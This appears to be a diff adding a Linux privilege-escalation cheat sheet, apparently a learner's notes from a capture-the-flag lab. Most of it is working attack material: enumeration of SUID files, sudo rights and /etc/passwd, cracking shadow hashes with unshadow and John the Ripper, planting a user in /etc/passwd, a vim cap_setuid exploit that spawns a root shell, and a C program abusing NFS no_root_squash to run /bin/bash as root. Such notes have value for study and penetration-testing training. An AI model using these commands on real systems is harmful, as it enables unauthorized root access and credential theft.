@@ -1,0 +1,126 @@
+### Host ###
+hostname
+
+### System Information ###
+uname -a
+cat /proc/version	# includes gcc version
+cat /etc/issue
+
+### OS version ###
+lsb_release -a
+
+### Processes ###
+ps -A	# show all running processes
+
+### Environmental Variables ###
+env
+
+### Sudo ###
+sudo -l		# Check for commands that user can run with 'sudo'
+
+### id ###
+id 			# general overview of the user’s privilege level and group memberships
+
+### Discocvering User ###
+cat /etc/passwd | grep home 	# most users are located in home directory
+
+### Network Information ###
+ifconfig
+netstat -a		# shows all listening ports and established connections
+netstat -lt		# show all TCP ports in Listening mode
+netstat -tp		# show connections with the service name and PID information
+netstat -i		# Shows interface statistics
+netstat -ano	#     -a: Display all sockets
+    			#	  -n: Do not resolve names
+    			#	  -o: Display timers
+
+### Find Files ###
+find . -name flag1.txt 			# find the file named “flag1.txt” in the current directory
+find /home -name flag1.txt 			# find the file names “flag1.txt” in the /home directory
+find / -type d -name config 			# find the directory named config under “/”
+find / -type f -perm 0777 			# find files with the 777 permissions (files readable, writable,
+									# executable by all users)
+find / -perm a=x 			# find executable files
+find /home -user frank 			# find all files for user “frank” under “/home”
+find / -mtime 10 			# find files that were modified in the last 10 days
+find / -atime 10 			# find files that were accessed in the last 10 day
+find / -cmin -60 			# find files changed within the last hour (60 minutes)
+find / -amin -60 			# find files accesses within the last hour (60 minutes)
+find / -size 50M 			# find files with a 50 MB size
+find / [text to search] -type d 2>/dev/null		# throw unwanted errors to /dev/null
+find / -writable -type d 2>/dev/null	# Find world-writeable folders
+find / -perm -222 -type d 2>/dev/null	# Find world-writeable folders
+find / -perm -o w -type d 2>/dev/null	# Find world-writeable folders
+find / -perm -u=s -type f 2>/dev/null	# Find files with the SUID bit, which allows us to run the file
+										# 	with a higher privilege level than the current user
+
+find / -name perl*			# Find development tools and supported languages
+find / -name python*		# Find development tools and supported languages
+find / -name gcc*			# Find development tools and supported languages
+find / -type f -perm -04000 -ls 2>/dev/null 	# find files that have SUID or SGID bits set
+
+
+### Cracking Password ###
+unshadow passwd.txt shadow.txt > passwords.txt 		# unshadow needs both the /etc/shadow and /etc/passwd
+													# files
+													#
+													#
+													# JohnTheRipper can then crack the passwords file
+
+### Adding User ###
+openssl passwd -[number] -salt [salt_text] [password]	# Generates salt hash of the password
+														# 
+e.g. openssl passwd -6 -salt abcd F@ke123				#
+														# 
+														# Then add this password with a username to the
+														# /etc/passwd file.
+
+
+### Capabilities ###
+getcap -r / 2>/dev/null									# shows binaries with enabled capabiities.
+														# capabilities can be used to perform
+														# 	a task without root privileges
+e.g. 
+./vim -c ':py3 import os; os.setuid(0); 				# Exploiting vim capabilities having
+		os.execl("/bin/sh", "sh", "-c", "reset; 		# 		"/home/karen/vim = cap_setuid+ep"
+			exec sh")'									# 
+
+### Cron Jobs (Scheduled Tasks) ###
+cat /etc/crontab									# show scheduled tasks
+													# modify/write permission on cron job is essential
+
+### PATH ###
+echo $PATH											# print $PATH variable
+find / -writable 2>/dev/null | cut -d "/" -f 2,3 	# prints all writable-folders and filters out procs 
+					| grep -v proc | sort -			# 			and gives us a cleaner output
+													#
+													# Add folder to PATH variable
+export PATH=[path_to_add]:$PATH						# e.g. export PATH=/home/zidan:$PATH
+
+
+### NFS (Network File Sharing) ###
+cat /etc/exports									# NFS config is kept here
+showmount -e [IP]									# Enumerate mountable shares
+													#
+mkdir [our_directory]								# Mount one of the “no_root_squash” shares to our
+													#
+sudo mount -o rw [IP]:/[directory_with_no_root_squash] 	#	attacking machine and start building our
+									[our_directory]		#	executable
+														#
+int main()												#
+{														# As we can set SUID bits, a simple executable  
+	setgid(0);											# 	that will run /bin/bash on the target
+	setuid(0);											# 	system will do the job. 
+	system("/bin/bash");								#
+	return 0;											# Name executable nfs.c
+}														#
+														#
+gcc nfs.c -o nfs -w 									# Compile executable
+chmod +s nfs											# Set SUID bit
+														# These executable files must be inside 
+														# 	[our_directory]
+														# Because we have worked on the mounted share,
+														# 	we don't need to transfer these files
+
+### Use PYTHON Terminal ###
+python3 -c "import pty;pty.spawn('/bin/bash')"
